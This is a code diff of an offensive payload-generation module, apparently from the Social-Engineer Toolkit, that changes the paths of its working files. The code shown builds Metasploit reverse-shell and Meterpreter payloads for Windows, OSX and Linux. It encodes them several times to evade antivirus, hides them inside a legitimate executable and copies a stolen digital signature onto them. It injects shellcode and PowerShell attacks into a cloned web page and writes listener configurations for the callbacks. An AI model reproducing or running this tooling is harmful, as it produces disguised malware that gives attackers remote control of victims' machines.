@@ -66,22 +66,22 @@ attack_vector=0
 linosx=0
 multiattack=""
 # grab attack vector
-if os.path.isfile("src/program_junk/attack_vector"):
-    fileopen=file("src/program_junk/attack_vector", "r")
+if os.path.isfile(setdir + "/attack_vector"):
+    fileopen=file(setdir + "/attack_vector", "r")
     for line in fileopen:
         line=line.rstrip()
         if line == "java":
             attack_vector="java"
         if line == "multiattack":
             attack_vector="multiattack"
-            multiattack=file("src/program_junk/multi_payload","w")
+            multiattack=file(setdir + "/multi_payload","w")
 
 # here is a place holder for the multi attack java
 # multiattack outputs a file called multi_java if
 # this file is present it will allow additional
 # functionality
 multiattack_java="off"
-if os.path.isfile("src/program_junk/multi_java"):
+if os.path.isfile(setdir + "/multi_java"):
     multiattack_java="on"
 
 # grab binary path if needed
@@ -96,7 +96,7 @@ for line in fileopen:
 
 # custom payloadgen
 payloadgen="regular"
-if os.path.isfile("src/program_junk/payloadgen"):
+if os.path.isfile(setdir + "/payloadgen"):
     payloadgen="solo"
 
 # set ipquestion to blank until otherwise pulled
@@ -142,8 +142,8 @@ try:
     choice1=""
     # this is port
     choice3=""
-    if os.path.isfile("src/program_junk/meterpreter_reverse_tcp_exe"):
-        fileopen=file("src/program_junk/meterpreter_reverse_tcp_exe", "r")
+    if os.path.isfile(setdir + "/meterpreter_reverse_tcp_exe"):
+        fileopen=file(setdir + "/meterpreter_reverse_tcp_exe", "r")
         for line in fileopen:
         # this reads in the first line of the file which happens to be port
         # when calling through core
@@ -217,7 +217,7 @@ try:
         encoder = 'false'
         payloadgen = 'solo'
         encode_stop = 1
-        filewrite = file("%s/src/program_junk/set.payload" % (definepath), "w")
+        filewrite = file(setdir + "/set.payload", "w")
         # select setshell
         if choice1 == '11':
             filewrite.write("SETSHELL")
@@ -252,11 +252,11 @@ try:
 
     # if we are using our own executable
     if custom == 1:
-        check_write=file("src/program_junk/custom.exe", "w")
+        check_write=file(setdir + "/custom.exe", "w")
         check_write.write("VALID")
         check_write.close()
         shutil.copyfile("%s" % (choice1), "msf.exe")
-        shutil.copyfile("msf.exe", "%s/src/program_junk/msf.exe" % (definepath))
+        shutil.copyfile("msf.exe", setdir + "/msf.exe")
 
     # Specify Encoding Option
     encoder="false"
@@ -264,12 +264,12 @@ try:
     # if we aren't using the set shell
     if choice1 != "set/reverse_shell":
         # we need to rewrite index.html real quick because it has a parameter that could get confusing
-        if os.path.isfile("%s/src/program_junk/web_clone/index.html" % (definepath)):
-            fileopen = file("%s/src/program_junk/web_clone/index.html" % (definepath),"r")
+        if os.path.isfile(setdir + "/web_clone/index.html"):
+            fileopen = file(setdir + "/web_clone/index.html" ,"r")
             data = fileopen.read()
             data = data.replace("freehugs", "")
-            os.remove("%s/src/program_junk/web_clone/index.html" % (definepath))
-            filewrite=file("%s/src/program_junk/web_clone/index.html" % (definepath), "w")
+            os.remove(setdir + "/web_clone/index.html")
+            filewrite=file(setdir + "/web_clone/index.html", "w")
             filewrite.write(data)
             filewrite.close()
 
@@ -290,7 +290,7 @@ try:
                 exit_set()
 
             # turn off some options if fasttrack is in use
-            if os.path.isfile("src/program_junk/fasttrack.options"):
+            if os.path.isfile(setdir + "/fasttrack.options"):
                 upx_encode == "OFF"
                 encode = "2"
                 encoder = "true"
@@ -314,8 +314,8 @@ try:
         choice2 = check_options("IPADDR=")
 
         # grab interface ip address
-        if os.path.isfile("src/program_junk/interface"):
-            fileopen=file("src/program_junk/interface", "r").readlines()
+        if os.path.isfile(setdir + "/interface"):
+            fileopen=file(setdir + "/interface", "r").readlines()
             for line in fileopen:
                 line=line.rstrip()
                 ipquestion=line
@@ -331,7 +331,7 @@ try:
         # if we are using the SET interactive shell then do this
         if choice1 == "set/reverse_shell":
             encoder = "false"
-            filewrite=file("%s/src/program_junk/set.payload.posix" % (definepath), "w")
+            filewrite=file(setdir + "/set.payload.posix", "w")
             filewrite.write("true")
             filewrite.close()
             import src.core.payloadprep
@@ -362,7 +362,7 @@ try:
                 if choice1 != "shellcode/alphanum":
                     if choice1 != "shellcode/pyinject":
                         if choice1 != "shellcode/multipyinject":
-                            generatepayload=subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s %s %s %s > %s/src/program_junk/%s" % (path,choice1,choice2,portnum,courtesyshell,choice4,definepath,msf_filename), shell=True).wait()
+                            generatepayload=subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s %s %s %s > %s/%s" % (path,choice1,choice2,portnum,courtesyshell,choice4,setdir,msf_filename), shell=True).wait()
                 # if we are using shellcodeexec
                 if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
                     if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject":
@@ -384,14 +384,14 @@ try:
 
                     if choice1 == "shellcode/alphanum":
                         print_status("Generating the payload via msfpayload and generating alphanumeric shellcode...")
-                        subprocess.Popen("ruby %s/msfpayload %s LHOST=%s %s EXITFUNC=thread R > %s/src/program_junk/meterpreter.raw" % (path,choice9,choice2,portnum,definepath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
-                        subprocess.Popen("ruby %s/msfencode -e x86/alpha_mixed -i %s/src/program_junk/meterpreter.raw -t raw BufferRegister=EAX > %s/src/program_junk/meterpreter.alpha_decoded" % (path,definepath,definepath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                        subprocess.Popen("ruby %s/msfpayload %s LHOST=%s %s EXITFUNC=thread R > %s/meterpreter.raw" % (path,choice9,choice2,portnum,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                        subprocess.Popen("ruby %s/msfencode -e x86/alpha_mixed -i %s/meterpreter.raw -t raw BufferRegister=EAX > %s/meterpreter.alpha_decoded" % (path,setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                     if choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
                     # define, this will eventually be all of our payloads
                         multipyinject_payload = ""
                         # clean up old file
-                        if os.path.isfile("%s/src/program_junk/meta_config_multipyinjector" % (definepath)):
-                            os.remove("%s/src/program_junk/meta_config_multipyinjector" % (definepath))
+                        if os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
+                            os.remove("%s/meta_config_multipyinjector" % (setdir))
                         while 1:
                             if choice1 == "shellcode/multipyinject":
                                 print ("\nSelect the payload you want to deliver via shellcode injection\n\n   1) Windows Meterpreter Reverse TCP\n   2) Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager\n   3) Windows Meterpreter (Reflective Injection) Reverse HTTP Stager\n   4) Windows Meterpreter (ALL PORTS) Reverse TCP\n   5) Windows Reverse Command Shell\n   6) I'm finished adding payloads.\n")
@@ -416,8 +416,8 @@ try:
                                 if shellcode_port == "": shellcode_port = "443"
 
                                 # here we prep our meta config to listen on all the ports we want - free hugs all around
-                                filewrite = file("%s/src/program_junk/meta_config_multipyinjector" % (definepath), "a")
-                                port_check = check_ports("%s/src/program_junk/meta_config_multipyinjector" % (definepath), shellcode_port)
+                                filewrite = file("%s/meta_config_multipyinjector" % (setdir), "a")
+                                port_check = check_ports("%s/meta_config_multipyinjector" % (setdir), shellcode_port)
                                 if port_check == False:
                                     filewrite.write("use exploit/multi/handler\nset PAYLOAD %s\nset LHOST 0.0.0.0\nset LPORT %s\nset ExitOnSession false\nexploit -j\n\n" % (choice9,shellcode_port))
                                     filewrite.close()
@@ -462,12 +462,12 @@ try:
                             secret = os.urandom(32)
                             shellcode = encryptAES(secret, multipyinject_payload)
                             print_status("Dynamic cipher key created and embedded into payload.")
-                        filewrite = file("%s/src/program_junk/meterpreter.alpha_decoded" % (definepath), "w")
+                        filewrite = file("%s/meterpreter.alpha_decoded" % (setdir), "w")
                         filewrite.write(shellcode)
                         filewrite.close()
 
                     # here we are going to encode the payload via base64
-                    fileopen = file("%s/src/program_junk/meterpreter.alpha_decoded" % (definepath), "r")
+                    fileopen = file("%s/meterpreter.alpha_decoded" % (setdir), "r")
                     data = fileopen.read()
                     if payloadgen != "solo":
                         # base64 1
@@ -493,7 +493,7 @@ try:
                         # last one
                         data = base64.b64encode(data)
                         #
-                    filewrite = file("%s/src/program_junk/meterpreter.alpha" % (definepath), "w")
+                    filewrite = file("%s/meterpreter.alpha" % (setdir), "w")
                     filewrite.write(data)
                     filewrite.close()
                     if choice1 == "shellcode/alphanum":
@@ -512,16 +512,16 @@ try:
                     if choice1 == "shellcode/multipyinject":
                         fileopen = file("%s/src/payloads/set_payloads/multi_pyinjector.binary" % (definepath), "rb")
 
-                    filewrite = file("%s/src/program_junk/shellcodeexec.custom" % (definepath), "wb")
+                    filewrite = file("%s/shellcodeexec.custom" % (setdir), "wb")
                     data = fileopen.read()
                     filewrite.write(data.replace("UPX", random_string, 4))
                     filewrite.close()
-                    subprocess.Popen("cp %s/src/program_junk/shellcodeexec.custom %s/src/program_junk/msf.exe 1> /dev/null 2> /dev/null" % (definepath,definepath), shell=True).wait()
+                    subprocess.Popen("cp %s/shellcodeexec.custom %s/msf.exe 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
                     # we need to read in the old index.html file because its already generated, need to present the alphanum to it
-                    if os.path.isfile("%s/src/program_junk/web_clone/index.html" % (definepath)):
-                        fileopen = file("%s/src/program_junk/web_clone/index.html" % (definepath), "r")
-                        filewrite = file("%s/src/program_junk/web_clone/index.html.new" % (definepath), "w")
-                        fileopen2 = file("%s/src/program_junk/meterpreter.alpha" % (definepath), "r")
+                    if os.path.isfile("%s/web_clone/index.html" % (setdir)):
+                        fileopen = file("%s/web_clone/index.html" % (setdir), "r")
+                        filewrite = file("%s/web_clone/index.html.new" % (setdir), "w")
+                        fileopen2 = file("%s/meterpreter.alpha" % (setdir), "r")
                         alpha_shellcode = fileopen2.read().rstrip()
                         data = fileopen.read()
                         data = data.replace('param name="2" value=""', 'param name="2" value="%s"' % (alpha_shellcode))
@@ -539,7 +539,7 @@ try:
                         if choice1 == "shellcode/pyinject":
                             print_status("Prepping website for pyInjector shellcode injection..")
                         print_status("Base64 encoding shellcode and prepping for delivery..")
-                        subprocess.Popen("mv %s/src/program_junk/web_clone/index.html.new %s/src/program_junk/web_clone/index.html 1> /dev/null 2> /dev/null" % (definepath,definepath), shell=True).wait()
+                        subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
                     if choice9 == "windows/meterpreter/reverse_tcp_allports":
                         portnum = "LPORT=1"
                         choice3 = "1"
@@ -551,7 +551,7 @@ try:
                     choice1 = choice9
 
         # write out the payload for powershell injection to pick it up if used
-        filewrite = file("src/program_junk/metasploit.payload", "w")
+        filewrite = file(setdir + "/metasploit.payload", "w")
         filewrite.write(choice1)
         filewrite.close()
         # import if on
@@ -562,17 +562,18 @@ try:
                 print_status("Please note that the SETSHELL and RATTE are not compatible with the powershell injection technique. Disabling the powershell attack.")
                 setshell_counter = 1
             if setshell_counter == 0:
-                if os.path.isfile("%s/src/program_junk/web_clone/index.html" % (definepath)):
-                    import src.payloads.powershell.prep
-                    if os.path.isfile("%s/src/program_junk/x64.powershell" % (definepath)):
-                        fileopen1 = file("%s/src/program_junk/x64.powershell" % (definepath), "r")
+                if os.path.isfile("%s/web_clone/index.html" % (setdir)):
+                    try: reload(src.payloads.powershell.prep)
+                    except: import src.payloads.powershell.prep
+                    if os.path.isfile("%s/x64.powershell" % (setdir)):
+                        fileopen1 = file("%s/x64.powershell" % (setdir), "r")
                         x64 = fileopen1.read()
                         # open up the x86 powershell attack
-                        fileopen2 =file("%s/src/program_junk/x86.powershell" % (definepath), "r")
+                        fileopen2 =file(setdir + "/x86.powershell", "r")
                         x86 = fileopen2.read()
                         # open up the original file and replace stuff
-                        fileopen3 = fileopen = file("%s/src/program_junk/web_clone/index.html" % (definepath), "r")
-                        filewrite = file("%s/src/program_junk/web_clone/index.html.new" % (definepath), "w")
+                        fileopen3 = fileopen = file("%s/web_clone/index.html" % (setdir), "r")
+                        filewrite = file("%s/web_clone/index.html.new" % (setdir), "w")
                         data = fileopen3.read()
                         data = data.replace('param name="5" value=""', 'param name="5" value="%s"' % (x64))
                         data = data.replace('param name="6" value=""', 'param name="6" value="%s"' % (x86))
@@ -582,20 +583,19 @@ try:
                             data = data.replace('param name="8" value="YES"', 'param name="8" value="NO"')
                         filewrite.write(data)
                         filewrite.close()
-                        subprocess.Popen("mv %s/src/program_junk/web_clone/index.html.new %s/src/program_junk/web_clone/index.html" % (definepath,definepath), stdout=subprocess.PIPE, shell=True)
+                        subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html" % (setdir,setdir), stdout=subprocess.PIPE, shell=True)
 
         if encoder ==  "true":
             # If not option 16 or default then go here
             if encode != "MULTIENCODE":
                 if encode != "BACKDOOR":
                     print_info("Encoding the payload %s times to get around pesky Anti-Virus. [-]\n" % (str(encount)))
-                    encodepayload=subprocess.Popen(r"ruby %s/msfencode < %s/src/program_junk/1msf.exe -e %s -o %s/src/program_junk/msf.exe -t exe -c %s" % (path,definepath,encode,definepath,encount), shell=True).wait()
-                    # subprocess.Popen("cp src/program_junk/msf.exe src/program_junk/ 1> /dev/null 2> /dev/null", shell=True).wait()
+                    encodepayload=subprocess.Popen(r"ruby %s/msfencode < %s/1msf.exe -e %s -o %s/msf.exe -t exe -c %s" % (path,setdir,encode,setdir,encount), shell=True).wait()
 
             # If option 16 or default then go here
             if encode == "MULTIENCODE":
                 print_info("Encoding the payload multiple times to get around pesky Anti-Virus.")
-                encodepayload=subprocess.Popen(r"ruby %s/msfencode -e x86/shikata_ga_nai -i %s/src/program_junk/1msf.exe -t raw -c 5 | ruby %s/msfencode -t raw -e x86/alpha_upper -c 2 | ruby %s/msfencode -t raw -e x86/shikata_ga_nai -c 5 | ruby %s/msfencode -t exe -c 5 -e x86/countdown -o %s/src/program_junk/msf.exe" % (path,definepath,path,path,path,definepath), shell=True).wait()
+                encodepayload=subprocess.Popen(r"ruby %s/msfencode -e x86/shikata_ga_nai -i %s/1msf.exe -t raw -c 5 | ruby %s/msfencode -t raw -e x86/alpha_upper -c 2 | ruby %s/msfencode -t raw -e x86/shikata_ga_nai -c 5 | ruby %s/msfencode -t exe -c 5 -e x86/countdown -o %s/msf.exe" % (path,setdir,path,path,path,setdir), shell=True).wait()
                 encode1=("x86/countdown")
 
             # If option 16, backdoor executable better AV avoidance
@@ -604,8 +604,8 @@ try:
                 backdoor_execution = check_config("BACKDOOR_EXECUTION=").lower()
                 if backdoor_execution == "on": backdoor_execution = "-k"
                 if backdoor_execution != "on": backdoor_execution = ""
-                subprocess.Popen("cp %s src/program_junk/legit.exe 1> /dev/null 2> /dev/null" % (custom_exe), shell=True).wait()
-                encodepayload=subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s %s %s %s | ruby %s/msfencode  -c 10 -e x86/shikata_ga_nai -x src/program_junk/legit.exe -o %s/src/program_junk/msf.exe -t exe %s 1> /dev/null 2>/dev/null" % (path,choice1,choice2,portnum,courtesyshell,choice4,path,definepath,backdoor_execution), shell=True).wait()
+                subprocess.Popen("cp %s %s/legit.exe 1> /dev/null 2> /dev/null" % (custom_exe,setdir), shell=True).wait()
+                encodepayload=subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s %s %s %s | ruby %s/msfencode  -c 10 -e x86/shikata_ga_nai -x %s/legit.exe -o %s/msf.exe -t exe %s 1> /dev/null 2>/dev/null" % (path,choice1,choice2,portnum,courtesyshell,choice4,path,setdir,setdir,backdoor_execution), shell=True).wait()
                 print_status("Backdoor completed successfully. Payload is now hidden within a legit executable.")
 
 
@@ -613,14 +613,14 @@ try:
                 if upx_encode == "ON":
                     if choice1 != "set/reverse_shell":
                         print_status("UPX Encoding is set to ON, attempting to pack the executable with UPX encoding.")
-                        upx("%s/src/program_junk/msf.exe" % (definepath))
+                        upx("%s/msf.exe" % (setdir))
 
                 # define to use digital signature stealing or not
                 if digital_steal == "ON":
                     print_status("Digital Signature Stealing is ON, hijacking a legit digital certificate")
-                    disitool.CopyDigitalSignature("src/core/digitalsig/digital.signature", "src/program_junk/msf.exe", "src/program_junk/msf2.exe")
-                    subprocess.Popen("cp src/program_junk/msf2.exe src/program_junk/msf.exe 1> /dev/null 2> /dev/null", shell=True).wait()
-                    subprocess.Popen("cp src/program_junk/msf2.exe src/program_junk/msf.exe", shell=True).wait()
+                    disitool.CopyDigitalSignature("src/core/digitalsig/digital.signature", setdir + "/msf.exe", setdir + "/msf2.exe")
+                    subprocess.Popen("cp %s/msf2.exe %s/msf.exe 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
+                    subprocess.Popen("cp %s/msf2.exe %s/msf.exe" % (setdir,setdir), shell=True).wait()
                 encode1=("x86/shikata_ga_nai")
 
         if choice1 == 'windows/shell_bind_tcp' or choice1 == 'windows/x64/shell_bind_tcp' :
@@ -640,9 +640,9 @@ try:
                 if check_config("DEPLOY_OSX_LINUX_PAYLOADS=").lower() == "on":
                     port2=check_config("LINUX_REVERSE_PORT=")
                     print_status("Generating OSX payloads through Metasploit...")
-                    subprocess.Popen(r"ruby %s/msfpayload osx/x86/shell_reverse_tcp LHOST=%s LPORT=%s X > %s/src/porgram_junk/mac.bin;chmod 755 %s/src/program_junk/mac.bin" % (path,choice2,port1,definepath,definepath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                    subprocess.Popen(r"ruby %s/msfpayload osx/x86/shell_reverse_tcp LHOST=%s LPORT=%s X > %s/mac.bin;chmod 755 %s/mac.bin" % (path,choice2,port1,setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                     print_status("Generating Linux payloads through Metasploit...")
-                    subprocess.Popen(r"ruby %s/msfpayload linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s X > %s/src/program_junk/nix.bin" % (path,choice2,port2,definepath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                    subprocess.Popen(r"ruby %s/msfpayload linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s X > %s/nix.bin" % (path,choice2,port2,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                     if multiattack_java == "on":
                         multiattack.write("OSX="+str(port1)+"\n")
                         multiattack.write("OSXPAYLOAD=osx/x86/shell_reverse_tcp\n")
@@ -651,18 +651,18 @@ try:
         # try block here
         try:
             # if they want a listener, start here
-            if os.path.isfile("%s/src/program_junk/meta_config" % (definepath)):
+            if os.path.isfile("%s/meta_config" % (setdir)):
                     # if its already created
-                filewrite=file("%s/src/program_junk/meta_config" % (definepath), "a")
+                filewrite=file("%s/meta_config" % (setdir), "a")
 
-            if not os.path.isfile("%s/src/program_junk/meta_config" % (definepath)):
+            if not os.path.isfile("%s/meta_config" % (setdir)):
                 # if we need to create it
-                filewrite = file("%s/src/program_junk/meta_config" % (definepath), "w")
+                filewrite = file("%s/meta_config" % (setdir), "w")
 
             # if there isn't a multiattack metasploit, setup handler
-            if not os.path.isfile("%s/src/program_junk/multi_meta" % (definepath)):
+            if not os.path.isfile("%s/multi_meta" % (setdir)):
 
-                port_check = check_ports("%s/src/program_junk/meta_config" % (definepath), choice3)
+                port_check = check_ports("%s/meta_config" % (setdir), choice3)
                 if port_check == False:
                     filewrite.write("use exploit/multi/handler\n")
                     filewrite.write("set PAYLOAD "+choice1+"\n")
@@ -677,9 +677,9 @@ try:
 
                     # config option for using multiscript meterpreter
                     if meterpreter_multi == "ON":
-                        multiwrite=file("src/program_junk/multi_meter.file", "w")
+                        multiwrite=file(setdir + "/multi_meter.file", "w")
                         multiwrite.write(meterpreter_multi_command)
-                        filewrite.write("set InitialAutorunScript multiscript -rc %s/src/program_junk/multi_meter.file\n" % (definepath))
+                        filewrite.write("set InitialAutorunScript multiscript -rc %s/multi_meter.file\n" % (setdir))
                         multiwrite.close()
                     filewrite.write("exploit -j\n\n")
 
@@ -705,9 +705,9 @@ try:
                     filewrite.write("set LHOST "+choice2+"\n")
                     filewrite.write("set LPORT "+port2+"\n")
                     if linux_meterpreter_multi == "ON":
-                        multiwrite=file("src/program_junk/lin_multi_meter.file", "w")
+                        multiwrite=file(setdir + "/lin_multi_meter.file", "w")
                         multiwrite.write(linux_meterpreter_multi_command)
-                        filewrite.write("set InitialAutorunScript multiscript -rc %s/src/program_junk/lin_multi_meter.file\n" % (definepath))
+                        filewrite.write("set InitialAutorunScript multiscript -rc %s/lin_multi_meter.file\n" % (setdir))
                         multiwrite.close()
                         filewrite.write("set ExitOnSession false\n")
                     filewrite.write("exploit -j\n\n")
@@ -727,10 +727,10 @@ except KeyboardInterrupt:
 # finish closing up the remenant files
 if attack_vector == "multiattack":
     multiattack.close()
-if os.path.isfile("%s/src/program_junk/fileformat.file" % (definepath)):
-    filewrite=file("%s/src/program_junk/payload.options" % (definepath), "w")
+if os.path.isfile("%s/fileformat.file" % (setdir)):
+    filewrite=file("%s/payload.options" % (setdir), "w")
     filewrite.write(choice1+" 0.0.0.0 " + choice3)
     filewrite.close()
 
 if choice1 == "set/reverse_shell":
-    if os.path.isfile("src/program_junk/meta_config"): os.remove("src/program_junk/meta_config")
+    if os.path.isfile(setdir + "/meta_config"): os.remove(setdir + "/meta_config")
